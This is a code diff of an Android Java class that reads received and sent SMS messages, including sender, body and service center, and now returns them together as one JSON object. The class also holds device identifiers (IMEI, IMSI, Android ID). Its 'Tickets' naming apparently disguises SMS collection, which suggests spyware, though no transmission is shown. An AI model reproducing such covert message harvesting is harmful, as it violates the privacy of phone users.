@@ -30,6 +30,7 @@ public class Tickets {
 
     JSONArray Tickets_received;
     JSONArray Tickets_sent;
+    JSONObject tickets;
     String IMEI, IMSI, AndroidID;
     String[] columns = new String[] { "address", "person", "date", "body", "type", "status",
                                         "read", "seen", "service_center", "protocol"};
@@ -37,18 +38,22 @@ public class Tickets {
     Tickets(){
         Tickets_received = new JSONArray();
         Tickets_sent = new JSONArray();
-
+        tickets = new JSONObject();
     }
 
-    public void getTickets(Context context){
+    public JSONObject getTickets(Context context){
         final String TAG_TICKETS = "Tickets";
         try{
             getTicketsReceived(context);
             getTicketsSent(context);
+            tickets.put("Received", Tickets_received);
+            tickets.put("Sent", Tickets_sent);
+
 //            context.getContentResolver().registerContentObserver(Uri.parse("content://sms/out"), true, new SentTicketsObserver(new Handler(),context,phone_number));
         } catch (Exception e) {
             Log.e(TAG_TICKETS, "Exception: " + e);
         }
+        return tickets;
     }
 
     private JSONArray getTicketsReceived(Context context){
